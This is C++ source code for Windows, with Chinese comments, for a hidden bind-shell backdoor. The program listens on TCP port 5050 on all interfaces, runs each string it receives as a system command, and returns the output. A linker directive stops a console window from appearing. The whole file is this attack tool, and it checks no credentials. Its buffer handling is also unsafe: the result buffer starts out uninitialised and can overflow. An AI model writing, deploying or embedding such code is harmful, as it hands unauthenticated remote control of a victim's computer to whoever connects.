
#include<windows.h>
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#pragma comment(lib,"ws2_32.lib")
#include <Winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
using namespace std;
#define DEFAULT_PORT 5050 //服务端默认端口

int execmd(char* cmd,char* result) {
      char buffer[128];                                     //定义缓冲区                                   
      FILE* pipe = _popen(cmd, "r");                  //打开管道，并执行命令 
      if (!pipe)
          return 0;                                 //返回0表示运行失败 
            
      while(!feof(pipe)) {
      if(fgets(buffer, 128, pipe)){                   //将管道输出到result中 
                  strcat(result,buffer);
            }
      }
      _pclose(pipe);                                          //关闭管道 
      return 1;                                                 //返回1表示运行成功 
}


int main(int argc, char* argv[])
{
    int iPort = DEFAULT_PORT;
    WSADATA wsaData;
    SOCKET sListen,sAccept;

    struct sockaddr_in ser,cli;
    WSAStartup(MAKEWORD(2,2),&wsaData);

    sListen = socket(AF_INET,SOCK_STREAM,0);

    ser.sin_family = AF_INET; 
    ser.sin_port = htons(iPort); 
    ser.sin_addr.s_addr = htonl(INADDR_ANY); 

    bind(sListen,(LPSOCKADDR)&ser,sizeof(ser));
    listen(sListen,5);
    int iLen = sizeof(cli);

    char res_str[1024];
    char send_str[1024*10];


    sAccept = accept(sListen, (struct sockaddr *)&cli, &iLen);

    while(1)
    {

        printf("Accepted client IP:[%s],port:[%d]---", inet_ntoa(cli.sin_addr), ntohs(cli.sin_port));

        memset(res_str, 0, 1024);
        cout << "wait..." << endl;
        recv(sAccept, res_str, sizeof(res_str),0);
        printf("Command: %s\n", res_str);

        if(execmd(res_str, send_str)){
            send(sAccept, send_str, sizeof(send_str),0);
            memset(send_str, 0, 1024*10);
        }
    }
    closesocket(sAccept);

    closesocket(sListen); //关闭 socket
    WSACleanup(); 
    return 0;
}